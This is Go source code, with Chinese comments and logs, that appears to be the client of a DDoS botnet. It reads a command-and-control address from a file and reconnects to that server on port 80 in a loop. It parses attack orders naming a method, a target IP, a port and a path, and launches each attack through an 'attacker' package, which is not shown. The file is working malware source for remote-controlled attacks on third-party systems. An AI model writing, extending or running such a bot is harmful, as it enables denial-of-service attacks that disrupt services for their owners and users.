package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"bot/attacker" 
)
const (
	c2File  = "./serverfile/c2.txt"
	retryPeriod = 10 * time.Second
)

func main() {
	c2Addr := readC2Address()
	
	for {
		conn, err := net.Dial("tcp", fmt.Sprintf("%s:80", c2Addr))
		if err != nil {
			log.Printf("连接C2失败: %v，%s后重试...", err, retryPeriod)
			time.Sleep(retryPeriod)
			continue
		}

		log.Printf("成功连接至C2服务器: %s", c2Addr)
		handleC2Connection(conn)
		conn.Close()
		log.Println("连接中断，开始重试...")
	}
}

func readC2Address() string {
	data, err := os.ReadFile(c2File)
	if err != nil {
		log.Fatalf("读取C2地址文件失败: %v", err)
	}
	return strings.TrimSpace(string(data))
}

func handleC2Connection(conn net.Conn) {
	defer conn.Close()

	reader := bufio.NewReader(conn)
	for {
		command, err := reader.ReadString('\n')
		if err != nil {
			if err == io.EOF {
				log.Println("C2服务器主动关闭连接")
			} else {
				log.Printf("读取指令错误: %v", err)
			}
			return
		}

		command = strings.TrimSpace(command)
		log.Printf("收到指令: %s", command)

		if method, ip, port, path, ok := parseCommand(command); ok {
			go attacker.AttackInit(method, ip, port, path)
			log.Printf("已启动攻击: [%s] %s:%d%s", method, ip, port, path)
		}
	}
}

func parseCommand(cmd string) (string, string, int, string, bool) {
	parts := strings.Fields(cmd)
	
	// 处理停止命令
	if len(parts) > 0 && parts[0] == "STOP" {
		return "STOP", "", 0, "", true
	} 
	
	// 检查是否有足够的参数 (至少需要方法、IP和端口)
	if len(parts) < 3 {
		log.Printf("无效指令格式: %s", cmd)
		return "", "", 0, "", false
	}

	// 验证IP地址
	ip := net.ParseIP(parts[1])
	if ip == nil {
		log.Printf("非法IP地址: %s", parts[1])
		return "", "", 0, "", false
	}

	// 验证端口号
	port, err := strconv.Atoi(parts[2])
	if err != nil || port < 1 || port > 65535 {
		log.Printf("非法端口号: %s", parts[2])
		return "", "", 0, "", false
	}

	// 处理可选的路径参数
	path := ""
	if len(parts) > 3 {
		path = parts[3]
		// 确保路径以/开头
		if !strings.HasPrefix(path, "/") {
			path = "/" + path
		}
	}

	return parts[0], parts[1], port, path, true
}